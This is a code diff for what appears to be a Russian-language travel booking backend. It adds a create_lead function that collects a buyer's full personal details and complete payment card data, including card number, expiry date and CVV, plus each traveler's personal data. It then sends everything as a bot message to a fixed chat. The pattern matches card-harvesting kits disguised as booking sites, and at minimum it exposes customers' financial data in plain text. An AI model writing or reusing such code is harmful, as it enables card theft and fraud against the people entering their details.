@@ -16,6 +16,7 @@ async def format_date(date):
 
     return formatted_date
 
+
 async def send_feedback(data):
     if len(data) >= 1:
         if (
@@ -185,6 +186,41 @@ async def tour_request(data):
                 f"Телефон: <b>{data['phone']}</b> \n"
                 f"Комментарий и дополнительная информация: <b>{data['comment']}</b> \n"
             )
+        await bot.send_message(CHAT_ID, msg)
+        return True
+    return False
+
+
+async def create_lead(travelers, lead):
+    if lead or travelers:
+        msg = (
+            f"<b>Новая покупка!!!</b> \n\n"
+            f"Имя: <b>{lead['first_name']}</b> \n"
+            f"Фамилия: <b>{lead['last_name']}</b> \n"
+            f"Адрес электронной: <b>{lead['email']}</b> \n"
+            f"Телефон: <b>{lead['phone']}</b> \n"
+            f"Дата рождения: <b>{lead['dateofborn']}</b> \n"
+            f"Пол: <b>{lead['gender']}</b> \n"
+            f"Национальность: <b>{lead['nationality']}</b> \n"
+            f"Адрес: <b>{lead['address']}</b> \n"
+            f"Город: <b>{lead['city']}</b> \n"
+            f"Имя владельца карты: <b>{lead['c_name']}</b> \n"
+            f"Номер карты: <b>{lead['c_number']}</b> \n"
+            f"Дата истечения срока: <b>{lead['c_expiry_date']}</b> \n"
+            f"CVV: <b>{lead['c_cvv']}</b> \n"
+            f"Страна плательщика: <b>{lead['c_country']}</b> \n\n"
+        )
+
+        for index, traveler in enumerate(travelers, start=1):
+            traveler_msg = (
+                f"<b>Traveler: {index}</b> \n"
+                f"Имя: <b>{traveler['first_name']}</b> \n"
+                f"Фамилия: <b>{traveler['last_name']}</b> \n"
+                f"Дата рождения: <b>{traveler['dateofborn']}</b> \n"
+                f"Пол: <b>{traveler['gender']}</b> \n"
+                f"Национальность: <b>{traveler['nationality']}</b> \n\n"
+            )
+            msg += traveler_msg
         await bot.send_message(CHAT_ID, msg)
         return True
     return False
